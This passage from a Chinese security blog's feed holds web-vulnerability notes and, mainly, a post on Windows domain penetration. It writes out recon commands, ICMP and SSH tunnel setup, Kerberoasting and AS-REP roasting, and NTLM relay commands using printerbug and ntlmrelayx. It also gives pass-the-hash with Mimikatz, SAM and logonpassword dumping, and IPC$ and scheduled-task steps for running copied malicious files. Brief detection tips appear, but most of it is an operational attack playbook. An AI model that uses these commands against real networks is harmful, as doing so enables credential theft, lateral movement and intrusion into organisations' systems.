(ruanyifeng.com)</a></p><h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240627173143109.png" alt="image-20240627173143109"></p><h2 id="jsonp劫持"><a href="#jsonp劫持" class="headerlink" title="jsonp劫持"></a>jsonp劫持</h2><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240627173121507.png" alt="image-20240627173121507"></p><p><img src="/" alt="img"></p><h2 id="x-frame-option"><a href="#x-frame-option" class="headerlink" title="x-frame-option"></a>x-frame-option</h2><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240627173049155.png" alt="image-20240627173049155"></p><h2 id="SOP与CSP"><a href="#SOP与CSP" class="headerlink" title="SOP与CSP"></a>SOP与CSP</h2><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240627173039773.png" alt="image-20240627173039773"></p><h2 id="RPO"><a href="#RPO" class="headerlink" title="RPO"></a>RPO</h2><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240627173814941.png" alt="image-20240627173814941"></p><p>对于a目录下的apache.php和nginx.php</p><p>访问a&#x2F;..%2f&#x2F;apache报404错误，但是nginx可以访问</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>（服务器可以识别..%2f但是浏览器不行，所以..%2f可以在url中跨目录访问index.php。但是在解析js脚本路径的时候无法穿越目录，也就导致了可以<strong>利用&#x2F;a..%2f..%2f..%2fz2zQAQ.php来运行根目录下的php文件同时包含a目录下的js</strong>）</p>]]></content>
    
    
    <categories>
      
      <category>web知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透</title>
    <link href="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <url>/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="Kerberos-认证"><a href="#Kerberos-认证" class="headerlink" title="Kerberos 认证"></a>Kerberos 认证</h3><p>当 Client 想要访问 Server 上的某个服务时,需要先向 AS 证明自己的身份,验证通过后 AS 会发放的一个 TGT,随后 Client 再次向 TGS 证明自己的身份,验证通过后 TGS 会发放一个 ST,最后 Client 向 Server 发起认证请求,这个过程分为三块：<br>  <strong>Client 与 AS 的交互,</strong><br>**  Client 与 TGS 的交互,**<br>**  Client 与 Server 的交互。**<br><strong>黄金票据是伪造 TGT，白银票据则是伪造 ST</strong></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/TnjRbqFw6obmhJx2CbZc7irynwe.png" alt="截图"></p><h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>结构 username:RID:LM-HASH:NT-HASH</p><p>LM Hash:DES，如果要停止使用 LM Hash,<strong>将用户的密码设置为 14 位以内，</strong> “ab35454a3435451404046” (表示 LMHash 为空值或被禁用)。</p><p>2008 开始默认禁用，个人版从 Windows Vista 以后，服务器版从 Wndows Sever 2003 后使用 NTLM Hash</p><h2 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h2><p><strong>两台计算机间的通信</strong>，其实是两台计算机中应用程序（进程）与应用程序（进程）间的通信。但“IP 地址”仅能定位到计算机，如何定位到应用程序（进程）呢？答案是“协议 + 端口”。<br>如果你对同源策略有所了解就能马上反应过来，这就是 IP + 协议 + 端口<br><strong>Socket</strong> 就是一个类，封装了许多功能函数，当需要建立连接进行通信时，它会先进行初始化，然后通过内置的功能函数建立连接并完成通信（打开、读&#x2F;写 IO、关闭），其中就包含了 TCP 的三次握手。<br><strong>正向代理和反向代理</strong>本质上并无区别，正向代理即客户端代理，代理客户端，服务端不知道实际发起请求的客户端。反向代理即服务端代理，代理服务端，客户端不知道实际提供服务的服务端。<br>正向代理可以隐藏用户的信息，并能够将其作为跳板访问我们无法访问的资源，如翻墙。反向代理可以隐藏服务器的信息，保障了内网的安全，同时能够用来实现负载均衡。（负载均衡也是防御 DOS 攻击的一种方式），对于反向代理而言，客户端不知道请求的目标主机真正 ip<br>在<strong>地址转换与端口映射</strong>中，<code>静态NAT</code> 是路由器上手动配置，一个内网地址和一个公网地址相关联，一一对应。<code>动态NAT</code> 是路由器上配置一个公网 IP 地址池，当内网地址访问外网时从地址池里获取公网 IP 进行映射。当公网 IP 地址池分配完时，只能等待被占用的公网 IP 被释放后，其他主机才能获取公网 IP 访问公网。这种将源地址进行转换的方式也可称之为 SNAT（源地址转换）。<code>NAPT 网络地址端口转换</code> 是允许多个内网地址映射到同一个公网 IP 的不同端口。这种将源地址和端口进行转换的方式也可称之为 SNAPT（源地址端口转换）。<br><strong>端口转发</strong>，有时被叫做隧道，是安全壳（SSH）为网络安全通信使用的一种方法。在内网中，是没有办法直接访问外网的。但是我们可以通过路由器的 NAT 方式访问外网。<br><strong>内网穿透</strong>是当想要访问内部网络但又没有权限去操作防火墙做端口映射的情况的时候，就需要搭建一条隧道来做端口转发和流量转发。<br><strong>正向 socks</strong>：当一个机器同时存在内外网 IP 时就能在外网通过正向连接去访问其它内网机器，而且这里跳板机就相当于正向代理。因为对于攻击者来说它是可知的，而对于内网机来说，它们并不知道它们返回给跳板机的响应又被发送给了攻击者。</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/HwexbH3zSoSMVXxXSwmckufunqh.png" alt="截图"></p><p><strong>反弹 socks</strong>：当目标机器没有公网 IP，但可访问内网资源时。攻击者可以在内网跳板机上运行 EarthWorm 使其反弹到某台对外连接的内网服务器上，然后攻击者再通过外网连接到对外服务器进而进入到内网中。这里公网服务器既是正向代理也是反向代理。对于攻击者来说它是可知的，因为我们要通过它访问我们无法访问的资源；对于内网服务器（跳板机）来说它也是可知的，因为我们是在内网服务器（跳板机）上执行的反弹命令，使其反向连接到公网服务器上。而内网服务器（跳板机）在这里充当的仅是公网服务器的正向代理，因为它对于公网服务器来说是可知的，而对于其他内网机来说则是不可知的。</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MC39bEdL9oVcAnx4WIXcLKjYnV5.png" alt="截图"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>委派</p><p>主机用户：活动目录中的主机，也叫机器用户</p><p>服务账户：将服务运行起来并加入域时用到的账户，例如 mysql 账户</p><p>委派：将域内用户账户的权限给予服务账户</p><h3 id="非约束性"><a href="#非约束性" class="headerlink" title="非约束性"></a>非约束性</h3><p>服务用户获得了用户的 TGT，获得了该用户所有的访问权限</p><p>1.域控默认配置</p><p>2.需要 SeEnableDelegationPrivilege 特权，该特权默认仅授予域管理员和企业管理员</p><h3 id="约束性"><a href="#约束性" class="headerlink" title="约束性"></a>约束性</h3><p>只获取了 ST，只能访问特定服务</p><p>分类</p><ol><li>仅使用 Kerberos，不能进行协议转换</li><li>使用任何身份验证协议</li></ol><h3 id="基于资源的约束性"><a href="#基于资源的约束性" class="headerlink" title="基于资源的约束性"></a>基于资源的约束性</h3><h2 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h2><p>利用广播和 respondor</p><p>windows 解析主机名：查看本地 hosts 查看 DNS 缓存和服务器 利用 LLMNR 或者 netbios</p><p>当内网中没有 dns 协议的时候，广播协议降级为 LLMN2 或者 netbios</p><p>可以构造一个 scf 恶意文件，触发降级的广播协议，respondor 截取到 ntlm hash</p><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><ol><li>打点拿下跳板机</li><li>net user &#x2F;domain 确认位置，寻找存活主机</li><li>提权，提取 hash</li><li>横向移动，拿下更多机子以及定位 dc 位置</li><li>提权域管，拿下 dc 后提前</li><li>PTT 维权，清理日志</li></ol><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="判断靶标系统"><a href="#判断靶标系统" class="headerlink" title="判断靶标系统"></a>判断靶标系统</h2><h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><p>windows 不敏感</p><h3 id="TTL"><a href="#TTL" class="headerlink" title="TTL"></a>TTL</h3><p>Ping windows 一般 ttl 大于 100</p><h2 id="脆弱端口"><a href="#脆弱端口" class="headerlink" title="脆弱端口"></a>脆弱端口</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Ae1bbTMIMoAuUfxHsLZc1V4knlc.png" alt="截图"></p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> 网络配置 ipconfig /<span class="hljs-keyword">all</span> <br> <span class="hljs-number">2.</span> 操作系统 systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; <br> <span class="hljs-number">3.</span> 软件信息 systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; <br> <span class="hljs-number">4.</span> 服务信息 wmic /namespace:\root\securitycenter2 pathantivirusproduct <span class="hljs-keyword">GET</span> displayName,productState,pathToSignedProductExe <br> <span class="hljs-number">5.</span> 用户列表 net <span class="hljs-keyword">user</span> <br> <span class="hljs-number">6.</span> 本地管理员信息 net localgroup administrators <br> <span class="hljs-number">7.</span> 端口信息 netstat –ano <br> <span class="hljs-number">8.</span> 补丁信息 wmic qfe <span class="hljs-keyword">get</span> Caption,Description,HotFixID,InstalledOn <br> <span class="hljs-number">9.</span> 查防火墙 netsh firewall <span class="hljs-keyword">show</span> config <br> 【域内信息收集】 <br> <span class="hljs-number">1.</span>是否有域：使用ipconfig /<span class="hljs-keyword">all</span>命令可以查看网关IP地址、DNS的IP地址以及判断当前主机 <br> <span class="hljs-number">2.</span>是否在域内：通过反向解析查询命令nslookup来解析域名的IP地址，使用解析出来的IP地址进行对比，判断域控制器和 DNS服务器是否在同一台服务器上 <br> <span class="hljs-number">3.</span>登录域信息：net config workstation <br> <span class="hljs-number">4.</span>ICMP探测内网：<span class="hljs-keyword">for</span> /L %I <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) <span class="hljs-keyword">DO</span> @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.174</span>.%I | findstr &quot;TTL=&quot; <br> <span class="hljs-number">5.</span>查询域信息：net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span> <br> <span class="hljs-number">6.</span>查询域主机：net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span>:XXX <br> <span class="hljs-number">7.</span>查询域用户：net <span class="hljs-keyword">group</span> /<span class="hljs-keyword">domain</span> <br> <span class="hljs-number">8.</span>查找域控：Nslookup -<span class="hljs-keyword">type</span>=SRV _ldap._tcp net <span class="hljs-type">time</span> /<span class="hljs-keyword">domain</span> net <span class="hljs-keyword">group</span> &quot;Domain Controllers&quot; /<span class="hljs-keyword">domain</span> <br> <span class="hljs-number">9.</span>查域用户信息：net <span class="hljs-keyword">user</span> /<span class="hljs-keyword">domain</span> <br> <span class="hljs-number">11.</span>查询域管理员：net <span class="hljs-keyword">group</span> &quot;Domain Admins&quot; /<span class="hljs-keyword">domain</span> <br> <span class="hljs-number">12.</span>查询域sid信息：whoami /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><h1 id="隧道搭建"><a href="#隧道搭建" class="headerlink" title="隧道搭建"></a>隧道搭建</h1><blockquote><p><a href="https://www.freebuf.com/articles/web/269523.html">https://www.freebuf.com/articles/web/269523.html</a><br><a href="https://xz.aliyun.com/t/12498?time__1311=mqmhD5AKYKBKDKG=D/zTy8=8E54Qq+D&alichlgref=https://cn.bing.com/#toc-2">https://xz.aliyun.com/t/12498?time__1311&#x3D;mqmhD5AKYKBKDKG%3DD%2FzTy8%3D8E54Qq%2BD&amp;alichlgref&#x3D;https%3A%2F%2Fcn.bing.com%2F#toc-2</a></p></blockquote><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p><strong>frp、ew、ssh、Neo-reGeorg、netsh、Lcx</strong><br>网络层：Ipv6 情况、icmp 情况、Gre 隧道<br>传输层：Tcp 隧道、udp 隧道 常规端口转发<br>应用层：ssh 隧道、http 隧道、https 隧道、dns 隧道</p><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>TCP&#x2F;UDP 协议：nc -zv  nc -zvu(u 为 udp)</p><p>HTTP 协议： curl wget</p><p>ICMP 协议： ping</p><p>DNS 协议： nslookup 或者 dig @ip</p><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><h3 id="ICMP-隧道"><a href="#ICMP-隧道" class="headerlink" title="ICMP 隧道"></a>ICMP 隧道</h3><p>Pingtunnel：将 tcp&#x2F;udp&#x2F;sock5 流量伪装为 icmp</p><p>服务器上开启服务</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo ./pingtunnel -<span class="hljs-keyword">type</span> <span class="hljs-type">server </span>-key [密钥,只限数字]<br></code></pre></td></tr></table></figure><p>客户端上连接服务器</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">pingtunnel<span class="hljs-selector-class">.exe</span> -type client -l :<span class="hljs-selector-attr">[转发本机2222端口作为ICMP隧道通讯端口]</span> -s <span class="hljs-selector-attr">[服务端IP]</span> -<span class="hljs-selector-attr">[转发类型]</span> <span class="hljs-number">1</span> -noprint <span class="hljs-number">1</span> -nolog <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ICMP转发为TCP<br>pingtunnel<span class="hljs-selector-class">.exe</span> -type client -l :<span class="hljs-number">4455</span> -s www<span class="hljs-selector-class">.yourserver</span><span class="hljs-selector-class">.com</span> -t www<span class="hljs-selector-class">.yourserver</span><span class="hljs-selector-class">.com</span>:<span class="hljs-number">4455</span> -tcp <span class="hljs-number">1</span><br>ICMP转发为UDP<br>pingtunnel<span class="hljs-selector-class">.exe</span> -type client -l :<span class="hljs-number">4455</span> -s www<span class="hljs-selector-class">.yourserver</span><span class="hljs-selector-class">.com</span> -t www<span class="hljs-selector-class">.yourserver</span><span class="hljs-selector-class">.com</span>:<span class="hljs-number">4455</span><br></code></pre></td></tr></table></figure><h3 id="DNS-隧道"><a href="#DNS-隧道" class="headerlink" title="DNS 隧道"></a>DNS 隧道</h3><p>dnscat2，原理：将数据通过 DNS 协议传输，需要一个独立的子域名通信，需要配置子域名后开放 udp，tcp53 端口，天剑 A 记录和 NS 记录</p><h3 id="SSH-隧道"><a href="#SSH-隧道" class="headerlink" title="SSH 隧道"></a>SSH 隧道</h3><h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h4><p>1.修改攻击机和跳板机 ssh 配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">攻击机<br>vi /etc/ssh/sshd_config<br>--GatewayPorts no改成<span class="hljs-built_in">yes</span>并且去掉注释<br>systemctl restart sshd.service<br>跳板机<br>AllowTcpForwarding <span class="hljs-built_in">yes</span>          <span class="hljs-comment"># 允许转发TCP协议</span><br>GatewayPorts <span class="hljs-built_in">yes</span>                <span class="hljs-comment"># 允许远程主机连接本地转发端口</span><br>PermitRootLogin <span class="hljs-built_in">yes</span>             <span class="hljs-comment"># 允许root登录</span><br>TCPKeepAlive <span class="hljs-built_in">yes</span>                <span class="hljs-comment"># 保持心跳，防止ssh断开</span><br>systemctl restart sshd.service<br></code></pre></td></tr></table></figure><ol start="2"><li></li></ol><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">ssh -CfNg -L <span class="hljs-comment">[本机端口]</span>:<span class="hljs-comment">[隧道访问的内网主机]</span>:<span class="hljs-comment">[隧道访问的内网主机端口]</span> <span class="hljs-comment">[双网卡跳板机SSH连接命令]</span><br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/HGuhbdOYboOamKxD4rFcdGyPnEd.png" alt="截图"></p><ol start="3"><li></li></ol><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">检查跳板机端口工作状态<br>netstat -tulnp <span class="hljs-string">| grep 端口</span><br></code></pre></td></tr></table></figure><ol start="4"><li></li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">本机连接跳板机端口（ssh填内网机器）<br>ssh -<span class="hljs-selector-tag">p</span> <span class="hljs-number">8888</span> root<span class="hljs-keyword">@127</span>.0.0.1<br></code></pre></td></tr></table></figure><h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">跳板机建立端口转发<br>ssh -R <span class="hljs-selector-attr">[远程主机端口]</span>: <span class="hljs-selector-attr">[目标主机]</span>: <span class="hljs-selector-attr">[目标主机端口]</span> <span class="hljs-selector-attr">[攻击者主机ssh]</span><br>攻击机直接连接内网<br>ssh -<span class="hljs-selector-tag">p</span> <span class="hljs-number">2222</span> root@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure><h4 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h4><h3 id="SOCKS-隧道"><a href="#SOCKS-隧道" class="headerlink" title="SOCKS 隧道"></a>SOCKS 隧道</h3><h3 id="HTTP-隧道"><a href="#HTTP-隧道" class="headerlink" title="HTTP 隧道"></a>HTTP 隧道</h3><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="windows-机器"><a href="#windows-机器" class="headerlink" title="windows 机器"></a>windows 机器</h2><p><a href="https://mp.weixin.qq.com/s/Cn0RcDgymcXpYsIacqJqmA">https://mp.weixin.qq.com/s/Cn0RcDgymcXpYsIacqJqmA</a></p><h3 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h3><p>利用 AS-REQ 包错误代码</p><p>kerbrute msf(kerberos_enumusers)</p><h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><p>获得密码后攻击不同用户</p><p>CrackMapExec kerbrute msf（smb_login）</p><p>防护：事件 ID 为 4768 且结果代码为 0x0 的审核成功的 Kerberos 身份验证服务事件日志</p><h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>没开启 kerberos 与身份验证，向域控 88 端口请求票据(rubeus ASPERoast.ps1 Adfind)后本地离线爆破（john hashcat）</p><p>防护：</p><ul><li>取消勾选“不要求 kerberos 预身份认证”选项</li><li>重点关注事件 ID 为 4768 且预身份验证为 0 的日志</li></ul><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a><strong>Kerberoasting</strong></h3><p>获取 ST 后爆破 hash</p><p>普通默认机器可以注册 spn，但是普通域用户需要权限，攻击需要域内用户，所有用户都可以查询 spn</p><p>1.获取 SPN(ServicePrincipal Names)服务主体名称（RiskySPN GetUserSPNs PowerView setspn）</p><p>2.请求服务票据(impacket.GetUserSPNs,Rubeus,POWERSHELL)</p><p>3.导出(cmd.Klist,kerbero,mimikatz,Empire)</p><p>4.破解(kerberoast hashcat)</p><p>防护：</p><ul><li>确保服务账户和密码为强密码</li><li>对域内服务账户权限进行限制</li><li>关注日志事件 ID 为 4769 的日志</li></ul><h3 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h3><p>主机用户：活动目录中的主机，也叫机器用户</p><p>服务账户：将服务运行起来并加入域时用到的账户，例如 mysql 账户</p><p>委派：将域内用户账户的权限给予服务账户</p><p>查询：Powershgell 脚本，Adfind，Ldapsearch</p><h3 id="NTLM-RELAY（嗅探）"><a href="#NTLM-RELAY（嗅探）" class="headerlink" title="NTLM RELAY（嗅探）"></a>NTLM RELAY（嗅探）</h3><p>responder 嗅探流量</p><p>受害机器查询不存在的主机名称后抓到 hash</p><p>配合 srf 文件</p><h4 id="打印机"><a href="#打印机" class="headerlink" title="打印机"></a>打印机</h4><p>域内任意用户访问目标机器的打印服务，printerbug.py 脚本会触发 SpoolService Bug，强制目标主机 AD 通过 MS-RPRNRPC 接口对攻击者进行 NTLM 身份认证。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> printerbug.py xuan/hack:p<span class="hljs-variable">@ss1234</span>@<span class="hljs-number">10.10.10.10</span> <span class="hljs-number">10.10.10.5</span><br></code></pre></td></tr></table></figure><h4 id="petitPotam"><a href="#petitPotam" class="headerlink" title="petitPotam"></a>petitPotam</h4><h3 id="重放"><a href="#重放" class="headerlink" title="重放"></a>重放</h3><p>利用以上手段获取到 ntlm hash 后 暴力破解之外可以使用中继的方式共计其他服务</p><p>SMB</p><p>工作组：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">python3</span> ntlmrelayx.py -t smb://<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.10</span> -smb3sup<span class="hljs-keyword">port</span> <span class="hljs-comment">--gpotato --gpotato-startup test.txt</span><br></code></pre></td></tr></table></figure><p>域环境：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">python3</span> smbrelayx.<span class="hljs-keyword">py</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span> -<span class="hljs-keyword">c</span> <span class="hljs-built_in">hostname</span><br><span class="hljs-keyword">python3</span>.<span class="hljs-number">11</span> ntlmrelayx.<span class="hljs-keyword">py</span> -t smb://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span> -<span class="hljs-keyword">c</span> <span class="hljs-built_in">hostname</span> -smb2support<br>sudo <span class="hljs-keyword">python3</span> MultiRelay.<span class="hljs-keyword">py</span> -t <span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span> -<span class="hljs-keyword">u</span> ALL<br></code></pre></td></tr></table></figure><p>还有 http ldap 等</p><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>hash 传递到其他机子上，通过 445（SMB 文件共享端口）和 135 端口(RPC 服务共享)横向</p><p>CrackMapExec,MSF(SMB&#x2F;PSEXEC),impacket-smbexec</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">目标机器上：sekurlsa:<span class="hljs-function">:pth</span> <span class="hljs-string">/user</span><span class="hljs-function">:administrator</span> <span class="hljs-string">/domain</span>:<span class="hljs-string">&quot;xxx.com&quot;</span> <span class="hljs-string">/ntlm</span><span class="hljs-function">:6542d35ed5ff6ae5e75b875068c5d3bc</span>  <span class="hljs-string">//</span>自行修改<br>net use \\ip\c$<br></code></pre></td></tr></table></figure><h4 id="获取-hash"><a href="#获取-hash" class="headerlink" title="获取 hash"></a>获取 hash</h4><p>Mimikatz, msf(hashdump | windows&#x2F;gather&#x2F;smart_hashdump) cs sam 表</p><p>prodump (微软自带，抓取 lsass 后本地处理)</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/GW14bMYCLoLO8Ox8ncVci65Unwh.png" alt="截图"></p><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>启动默认共享</p><p>用户账密</p><p>打开 445,139</p><h3 id="基础利用"><a href="#基础利用" class="headerlink" title="基础利用"></a>基础利用</h3><p>（查看目录和杀软）</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\目标IP\ipc$ <span class="hljs-string">&quot;密码&quot;</span> /user:用户名<br>查看：<span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span><br><span class="hljs-keyword">dir</span> \\目标ip\c$<br>tasklist /S ip /<span class="hljs-keyword">U</span> 用户 /P 密码<br></code></pre></td></tr></table></figure><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>at</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">查看时间 net time \\<span class="hljs-built_in">ip</span><br>复制恶意文件 copy 文件名 \\<span class="hljs-built_in">ip</span>\C$<br>创建计划任务 <span class="hljs-meta">at</span> \\ <span class="hljs-built_in">ip</span> 时间 路径<br>痕迹清理 <span class="hljs-meta">at</span> \\<span class="hljs-built_in">ip</span> 任务号 /delete<br></code></pre></td></tr></table></figure><p>Schtasks</p><p>创建计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">创建 schtasks /create /s ip /tn 计划名/sc onstart /tr c:\dayu.txt /ru system /f<br>运行 schtasks /run /s ip /i /tn <span class="hljs-string">&quot;计划名&quot;</span><br>指定ipc账号 /u /p <br>删除 schtasks /delete /s ip /tn <span class="hljs-string">&quot;计划名&quot;</span> -f<br>痕迹清理 net use 名称 /del /y<br></code></pre></td></tr></table></figure><h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h3 id="通过-SAM-和-System"><a href="#通过-SAM-和-System" class="headerlink" title="通过 SAM 和 System"></a>通过 SAM 和 System</h3><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nsis">手动<br>reg save <span class="hljs-params">hklm</span>\sam sam.hive<br>reg save <span class="hljs-params">hklm</span>\<span class="hljs-params">system</span> <span class="hljs-params">system</span>.hive<br><span class="hljs-title function_">lsadump::sam</span> /sam:sam.hive /<span class="hljs-params">system</span>:<span class="hljs-params">system</span>.hive    <span class="hljs-comment">#文件和mimikatz放在同一目录</span><br></code></pre></td></tr></table></figure><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nsis">①<br>mimikatz<br><span class="hljs-title function_">privilege::debug</span>    <span class="hljs-comment">#提升权限</span><br><span class="hljs-title function_">token::elevate</span>    <span class="hljs-comment">#system权限</span><br><span class="hljs-title function_">lsadump::sam</span>    <span class="hljs-comment">#读取本地SAM文件，获取NTML Hash</span><br>②<br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;log&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span>    <span class="hljs-comment">#在线读取散列值及明文密码</span><br><br>利用密码增添用户<br><span class="hljs-title function_">privilege::debug</span><br><span class="hljs-title function_">sekurlsa::pth</span> /<span class="hljs-literal">user</span>:administrator /domain:workgroup <br>/ntlm:<span class="hljs-number">6</span>c5fbeb7c83cf7afe04f8d7e38852d52<br></code></pre></td></tr></table></figure><h3 id="powershell"><a href="#powershell" class="headerlink" 